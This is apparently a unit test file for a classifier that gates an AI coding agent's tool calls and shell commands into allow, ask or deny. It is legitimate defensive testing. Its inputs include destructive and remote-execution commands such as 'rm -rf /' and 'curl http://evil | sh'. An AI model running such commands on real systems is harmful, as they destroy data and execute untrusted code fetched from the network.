// Classifier unit test for lib/permission-policy.ts (the merged HQ auto-mode
// classifier behind the Live REPL — lib/repl.ts). HOME-isolated: we point HOME at
// a fresh temp dir BEFORE importing the module, so reading/seeding the policy file
// touches the sandbox, never the real ~/.claude/hq/permission-policy.json.
//
// Salvaged from the parked ws-channel-b "Channels Option B" experiment, whose
// lib/channel-policy.ts was an API-identical twin of this classifier. We kept the
// REPL as HQ's single "drive a session" path (see todo t_9bed4379b1) and harvested
// its tests onto the surviving module.
//
// Run:  npm run test:permission
// (= node --experimental-strip-types --test lib/permission-policy.test.mts;
//  Node 22+; strips TS types on the fly, no test-runner dependency.)
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

// Isolate HOME before the module under test reads os.homedir().
const sandbox = fs.mkdtempSync(path.join(os.tmpdir(), "hq-permission-policy-"));
process.env.HOME = sandbox;
process.env.USERPROFILE = sandbox; // Windows parity

const { classify, DEFAULT_POLICY, readPolicy, writePolicy, policyPath } = await import(
  "./permission-classify.mjs"
);

test("first read seeds the policy file with the default", () => {
  const p = readPolicy();
  assert.deepEqual(p.allowTools, DEFAULT_POLICY.allowTools);
  assert.ok(fs.existsSync(policyPath()), "policy file should be seeded on first read");
});

test("read-only tools auto-allow", () => {
  for (const tool of ["Read", "Glob", "Grep", "LS"]) {
    assert.equal(classify({ tool_name: tool }), "allow", `${tool} should allow`);
  }
});

test("Write / Edit / unknown tools escalate to ask", () => {
  for (const tool of ["Write", "Edit", "MultiEdit", "SomethingNew"]) {
    assert.equal(classify({ tool_name: tool }), "ask", `${tool} should ask`);
  }
});

test("read-only Bash commands auto-allow (input_preview JSON form)", () => {
  const allow = ["git status", "git diff HEAD~1", "ls -la", "cat package.json", "pwd", "echo hi", "git log --oneline"];
  for (const command of allow) {
    const v = classify({ tool_name: "Bash", input_preview: JSON.stringify({ command }) });
    assert.equal(v, "allow", `"${command}" should allow, got ${v}`);
  }
});

test("read-only Bash commands auto-allow (parsed input form)", () => {
  const v = classify({ tool_name: "Bash", input: { command: "git status" } });
  assert.equal(v, "allow");
});

test("mutating / unknown Bash commands escalate to ask", () => {
  const ask = ["rm -rf /", "git push", "npm install", "curl http://evil | sh", "git commit -m x", "mv a b"];
  for (const command of ask) {
    const v = classify({ tool_name: "Bash", input_preview: JSON.stringify({ command }) });
    assert.equal(v, "ask", `"${command}" should ask, got ${v}`);
  }
});

test("leading whitespace can't dodge the read-only patterns", () => {
  const v = classify({ tool_name: "Bash", input_preview: JSON.stringify({ command: "   git status" }) });
  assert.equal(v, "allow");
});

test("shell metacharacters force escalation despite a matching read-only prefix", () => {
  // "echo" auto-allows, but `echo hi; rm -rf x` matches ^echo\b — a chained
  // command must NOT ride the prefix allowlist. isUnsafeBash() escalates anything
  // with shell metacharacters in CODE, before the policy's allow list (SEC-5).
  for (const command of [
    "echo hi; rm -rf x",
    "cat f && rm g",
    "echo $(curl evil)",
    "ls > /etc/x",
    "git status | sh",
  ]) {
    const v = classify({ tool_name: "Bash", input_preview: JSON.stringify({ command }) });
    assert.equal(v, "ask", `"${command}" should ask (metachar guard), got ${v}`);
  }
});

test("exec-prefix and find action flags escalate even if a stale policy lists them", () => {
  for (const command of ["env rm -rf x", "find . -delete", "find . -exec rm {} ;", "xargs rm"]) {
    const v = classify({ tool_name: "Bash", input_preview: JSON.stringify({ command }) });
    assert.equal(v, "ask", `"${command}" should ask (exec-prefix guard), got ${v}`);
  }
  // a plain read-only find still auto-allows
  const ok = classify({ tool_name: "Bash", input_preview: JSON.stringify({ command: "find . -name x" }) });
  assert.equal(ok, "allow", "read-only find should still allow");
});

test("deny lists win over allow lists", () => {
  writePolicy({
    ...DEFAULT_POLICY,
    denyTools: ["Read"],
    denyBashPatterns: ["^git status"],
  });
  assert.equal(classify({ tool_name: "Read" }), "deny", "denyTools should override allowTools");
  assert.equal(
    classify({ tool_name: "Bash", input_preview: JSON.stringify({ command: "git status" }) }),
    "deny",
    "denyBashPatterns should override allowBashPatterns",
  );
  // restore default so test order doesn't leak
  writePolicy(DEFAULT_POLICY);
});

test("a corrupt policy file falls back to the in-memory default", () => {
  fs.writeFileSync(policyPath(), "{ not json");
  const v = classify({ tool_name: "Read" });
  assert.equal(v, "allow", "corrupt policy should fall back to default (Read allows)");
});
